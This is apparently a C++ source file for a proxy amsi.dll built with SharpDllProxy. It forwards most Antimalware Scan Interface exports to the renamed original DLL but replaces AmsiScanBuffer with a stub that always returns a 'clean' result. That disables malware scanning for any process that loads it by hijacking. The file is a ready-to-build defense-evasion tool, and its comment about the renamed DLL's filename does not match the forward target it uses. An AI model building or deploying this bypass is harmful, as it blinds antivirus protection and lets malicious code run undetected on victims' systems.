// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

// generated with sharpdllproxy.
// place amsi.dll renamed as tmp61DB.dll in the same directory for the forwards to work
#pragma comment(linker, "/export:AmsiCloseSession=realamsi.AmsiCloseSession,@1")
#pragma comment(linker, "/export:AmsiInitialize=realamsi.AmsiInitialize,@2")
#pragma comment(linker, "/export:AmsiOpenSession=realamsi.AmsiOpenSession,@3")
#pragma comment(linker, "/export:AmsiScanString=realamsi.AmsiScanString,@5")
#pragma comment(linker, "/export:AmsiUacInitialize=realamsi.AmsiUacInitialize,@6")
#pragma comment(linker, "/export:AmsiUacScan=realamsi.AmsiUacScan,@7")
#pragma comment(linker, "/export:AmsiUacUninitialize=realamsi.AmsiUacUninitialize,@8")
#pragma comment(linker, "/export:AmsiUninitialize=realamsi.AmsiUninitialize,@9")
#pragma comment(linker, "/export:DllCanUnloadNow=realamsi.DllCanUnloadNow,@10")
#pragma comment(linker, "/export:DllGetClassObject=realamsi.DllGetClassObject,@11")
#pragma comment(linker, "/export:DllRegisterServer=realamsi.DllRegisterServer,@12")
#pragma comment(linker, "/export:DllUnregisterServer=realamsi.DllUnregisterServer,@13")

#define AMSI_RESULT_CLEAN 0

extern "C" __declspec(dllexport) HRESULT AmsiScanBuffer(
    HANDLE amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    LPVOID amsiSession,
    INT * result
)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}